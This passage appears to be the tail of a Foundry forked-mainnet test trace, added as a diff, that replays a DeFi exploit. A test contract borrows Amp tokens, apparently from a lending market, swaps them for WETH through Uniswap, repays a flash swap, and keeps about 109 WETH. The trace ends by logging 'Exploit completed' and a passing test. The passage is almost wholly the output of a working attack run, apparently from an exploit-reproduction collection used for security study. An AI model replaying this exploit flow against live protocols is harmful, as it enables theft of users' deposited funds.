+    │   │   │   │   │   │   @ 0x755303852e9d37ba89f8d7ed329dac976d9b4e2d10c29c8c06b3e8c55a8b25d6: 0 → 0x000000000000000000000000000000000000000000101d0cea7f08a45f000000
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ emit Borrow(borrower: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], borrowAmount: 19480000000000000000000000 [1.948e25], accountBorrows: 19480000000000000000000000 [1.948e25], totalBorrows: 489649340036725221561094894 [4.896e26])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xa20c45dd8a851b8b8653a17982859bee31b444ff681134f34d4fa90171fb1a2b: 0 → 0x0000000000000000000000000000000000000000000000000e26de82b5ceec29
+    │   │   │   │   │   @ 11: 0x00000000000000000000000000000000000000000184ea3afec513e4d7e252ee → 0x000000000000000000000000000000000000000001950747e9441c8936e252ee
+    │   │   │   │   │   @ 19: 0x0000000000000000000000000000000000000000001bd8996e2eff8269f88143 → 0x0000000000000000000000000000000000000000000bbb8c83aff6de0af88143
+    │   │   │   │   │   @ 0xa20c45dd8a851b8b8653a17982859bee31b444ff681134f34d4fa90171fb1a2a: 0 → 0x000000000000000000000000000000000000000000101d0cea7f08a45f000000
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [21974] WETH9::deposit{value: 355000000000000000000}()
+    │   │   │   ├─ emit Deposit(dst: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], wad: 355000000000000000000 [3.55e20])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0x0000000000000000000000000000000000000000000000133e9d5b211fac0000
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [26922] Amp::approve(UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 19480000000000000000000000000 [1.948e28])
+    │   │   │   ├─ emit ApprovalByPartition(partition: 0x0000000000000000000000000000000000000000000000000000000000000000, owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], value: 19480000000000000000000000000 [1.948e28])
+    │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], value: 19480000000000000000000000000 [1.948e28])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x6ea4483a86392dea92ae0f235dcb3aa993aec253fc0b4ef9f7c1ea2aa8810b4a: 0 → 0x00000000000000000000000000000000000000003ef17a740039c21318000000
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [95918] UniswapV2Router02::swapExactTokensForTokens(19480000000000000000000000 [1.948e25], 1, [0xfF20817765cB7f73d4bde2e66e067E58D11095C2, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1630302276 [1.63e9])
+    │   │   │   ├─ [2504] 0x08650bb9dc722C9c8C62E79C2BAfA2d3fc5B3293::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 975018292290218898234 [9.75e20], 54500123291644810090649509 [5.45e25], 1630302266 [1.63e9]
+    │   │   │   ├─ [42579] Amp::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x08650bb9dc722C9c8C62E79C2BAfA2d3fc5B3293, 19480000000000000000000000 [1.948e25])
+    │   │   │   │   ├─ [2942] ERC1820Registry::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x60881b58a7ad1ebd3bc0e92b8277996363a67ded0f43bd95d11c320bab72b5a4) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   │   │   ├─ [2942] ERC1820Registry::getInterfaceImplementer(0x08650bb9dc722C9c8C62E79C2BAfA2d3fc5B3293, 0xfa352d6368bbc643bcf9d528ffaba5dd3e826137bc42f935045c6c227bd4c72a) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x08650bb9dc722C9c8C62E79C2BAfA2d3fc5B3293, value: 19480000000000000000000000 [1.948e25])
+    │   │   │   │   ├─ emit TransferByPartition(fromPartition: 0x0000000000000000000000000000000000000000000000000000000000000000, operator: UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x08650bb9dc722C9c8C62E79C2BAfA2d3fc5B3293, value: 19480000000000000000000000 [1.948e25], data: 0x, operatorData: 0x)
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x755303852e9d37ba89f8d7ed329dac976d9b4e2d10c29c8c06b3e8c55a8b25d6: 0x000000000000000000000000000000000000000000101d0cea7f08a45f000000 → 0
+    │   │   │   │   │   @ 0xd71c5065f44c4a0800fa9336624a57623dfb9a93f190d91ebb292fe3084224b4: 0x000000000000000000000000000000000000000000101d0cea7f08a45f000000 → 0
+    │   │   │   │   │   @ 0xe322ddc3bcda59ceeddea5e70753d16a37e6d0f09c9b678cd67ca9a406eeb018: 0x0000000000000000000000000000000000000000002d14d99a8a8a510d9617a5 → 0x0000000000000000000000000000000000000000003d31e6850992f56c9617a5
+    │   │   │   │   │   @ 0x28771ffa18a1f355b0acb3c2b96320d7d689d5a4ff51cb1926883e6fa255c0ef: 1 → 0
+    │   │   │   │   │   @ 0x6ea4483a86392dea92ae0f235dcb3aa993aec253fc0b4ef9f7c1ea2aa8810b4a: 0x00000000000000000000000000000000000000003ef17a740039c21318000000 → 0x00000000000000000000000000000000000000003ee15d6715bab96eb9000000
+    │   │   │   │   │   @ 0xdbbde71e1a4080345235257e965b73612794cf3c85775e62f0a4e44906b67515: 1 → 0
+    │   │   │   │   │   @ 0x2d68ab668c2a485a326ab366baa6f60a32eebd4a205a39be46a1abc2321150ec: 0x0000000000000000000000000000000000000000002d14d99a8a8a510d9617a5 → 0x0000000000000000000000000000000000000000003d31e6850992f56c9617a5
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [40516] 0x08650bb9dc722C9c8C62E79C2BAfA2d3fc5B3293::swap(256168087922212625919 [2.561e20], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   ├─ [8062] WETH9::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 256168087922212625919 [2.561e20])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x08650bb9dc722C9c8C62E79C2BAfA2d3fc5B3293, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 256168087922212625919 [2.561e20])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x0000000000000000000000000000000000000000000000133e9d5b211fac0000 → 0x00000000000000000000000000000000000000000000002121a939dba2305dff
+    │   │   │   │   │   │   @ 0xd7a62467018182711d671773d6ced3f9e6d03a3d07d22ca0c835b14823e6fe82: 0x000000000000000000000000000000000000000000000034db18d2f83a7c333a → 0x000000000000000000000000000000000000000000000026f80cf43db7f7d53b
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [534] WETH9::balanceOf(0x08650bb9dc722C9c8C62E79C2BAfA2d3fc5B3293) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 718850204368006272315 [7.188e20]
+    │   │   │   │   ├─ [597] Amp::balanceOf(0x08650bb9dc722C9c8C62E79C2BAfA2d3fc5B3293) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 73980123291644810090649509 [7.398e25]
+    │   │   │   │   ├─ emit Sync(reserve0: 718850204368006272315 [7.188e20], reserve1: 73980123291644810090649509 [7.398e25])
+    │   │   │   │   ├─ emit Swap(sender: UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], amount0In: 0, amount1In: 19480000000000000000000000 [1.948e25], amount0Out: 256168087922212625919 [2.561e20], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 10: 0x0000000000000000000000000000000001fb87230bc662885888f89773fc3d77 → 0x0000000000000000000000000000000001fb872ec540c567f82c19c7cf8b8cb3
+    │   │   │   │   │   @ 9: 0x000000000000000000000000021bbda4ef8d0be299d7804be409867e0ac8a60e → 0x000000000000000000000000021bbdad77022ed9674a27b1da6c9901605b47ba
+    │   │   │   │   │   @ 8: 0x612c703a0000002d14d99a8a8a510d9617a5000000000034db18d2f83a7c333a → 0x612c70440000003d31e6850992f56c9617a5000000000026f80cf43db7f7d53b
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Return] [19480000000000000000000000 [1.948e25], 256168087922212625919 [2.561e20]]
+    │   │   ├─ [3262] WETH9::transfer(UniswapV2Pair: [0xd3d2E2692501A5c9Ca623199D38826e513033a17], 502000000000000000000 [5.02e20])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: UniswapV2Pair: [0xd3d2E2692501A5c9Ca623199D38826e513033a17], value: 502000000000000000000 [5.02e20])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x00000000000000000000000000000000000000000000002121a939dba2305dff → 0x000000000000000000000000000000000000000000000005eb02f59164185dff
+    │   │   │   │   @ 0xc0e75612d35d156c6027aa01afe2ad7d80853c95e612a023a4992c7cbe19ff21: 0x000000000000000000000000000000000000000000000361f7314e2d02839b1d → 0x00000000000000000000000000000000000000000000037d2dd79277409b9b1d
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [534] WETH9::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 109168087922212625919 [1.091e20]
+    │   │   ├─ [25162] WETH9::transfer(DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], 109168087922212625919 [1.091e20])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], value: 109168087922212625919 [1.091e20])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x000000000000000000000000000000000000000000000005eb02f59164185dff → 0
+    │   │   │   │   @ 0x0a94e286e9304854df5b3f17b7089cd30cba9c4e94387f348447ad723c407a44: 0 → 0x000000000000000000000000000000000000000000000005eb02f59164185dff
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop]
+    │   ├─ [2797] Uni::balanceOf(UniswapV2Pair: [0xd3d2E2692501A5c9Ca623199D38826e513033a17]) [staticcall]
+    │   │   └─ ← [Return] 1992277665188069083236236 [1.992e24]
+    │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0xd3d2E2692501A5c9Ca623199D38826e513033a17]) [staticcall]
+    │   │   └─ ← [Return] 16476245727715211844381 [1.647e22]
+    │   ├─ emit Sync(reserve0: 1992277665188069083236236 [1.992e24], reserve1: 16476245727715211844381 [1.647e22])
+    │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 0, amount1In: 502000000000000000000 [5.02e20], amount0Out: 0, amount1Out: 500000000000000000000 [5e20], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─  storage changes:
+    │   │   @ 10: 0x0000000000000000000000000000c74858bcf3be3a60d4049bc648c307db9bab → 0x0000000000000000000000000000c748723f539c51a5314a3a05f937ed657fc7
+    │   │   @ 8: 0x612c700e00000000037d1216250ff1d39b1d00000001a5e196b11516b2bcc78c → 0x612c704400000000037d2dd79277409b9b1d00000001a5e196b11516b2bcc78c
+    │   │   @ 9: 0x00000000000000000000000000000004a60be0cccf834db4ec1de4794558cfcd → 0x00000000000000000000000000000004a60c531c84eb0b0a7d95145bb5b78aa5
+    │   └─ ← [Stop]
+    ├─ [534] WETH9::balanceOf(DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38]) [staticcall]
+    │   └─ ← [Return] 109168087922212625919 [1.091e20]
+    ├─ emit log_named_uint(key: "Exploit completed, WETH Balance", val: 109168087922212625919 [1.091e20])
+    ├─  storage changes:
+    │   @ 38: 0 → 0x0000000000000000000000001804c8ab1f12e6bbf3894d4083f33e07309d1f38
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 33.94s (32.38s CPU time)
+
+Ran 1 test suite in 37.49s (33.94s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
